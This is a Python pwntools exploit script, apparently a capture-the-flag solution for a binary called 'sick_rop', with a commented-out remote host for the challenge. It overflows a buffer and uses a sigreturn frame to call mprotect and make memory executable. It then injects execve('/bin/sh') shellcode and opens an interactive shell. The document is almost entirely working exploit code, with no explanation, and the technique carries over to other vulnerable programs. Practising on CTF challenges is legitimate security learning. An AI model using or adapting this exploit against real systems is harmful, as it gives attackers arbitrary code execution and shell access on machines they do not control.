from pwn import *
 
context.arch = "amd64"
#context.log_level = 'debug'
 
#r = remote("206.189.125.80", 32264)
r = gdb.debug("./sick_rop")
#r = process("./sick_rop")
#binary = ELF("./sick_rop")
 
padding = b'A' * 32
padding += b'BBBBCCCC'
 
syscall_addr = 0x401014
vuln_ptr = 0x4010d8
 
shellcode =  """mov rdi, 0x68732f6e69622f
                push rdi
                mov rdi, rsp
                mov rax, 0x3b
                xor rsi, rsi
                xor rdx, rdx
                syscall"""
assembled_shellcode = asm(shellcode)
 
 
frame = SigreturnFrame()
frame.rax = 0xA
frame.rdi = 0x400000
frame.rsi = 0x10000 
frame.rdx = 0x7     
frame.rsp = vuln_ptr
frame.rip = syscall_addr
 
log.info("Changing permission for this address for shellcode: " + hex(frame.rdi))
log.info("New RSP address: " + hex(frame.rsp))
 
payload = padding + p64(0x0040102e) + p64(syscall_addr) + bytes(frame)
r.sendline(payload)
r.recv()    

r.sendline(b'A' * 14)
r.recv()
 
payload = padding + p64(vuln_ptr+0x10) + assembled_shellcode
r.sendline(payload)
r.recv()    # wait for input's echo due to write()
 
r.interactive()
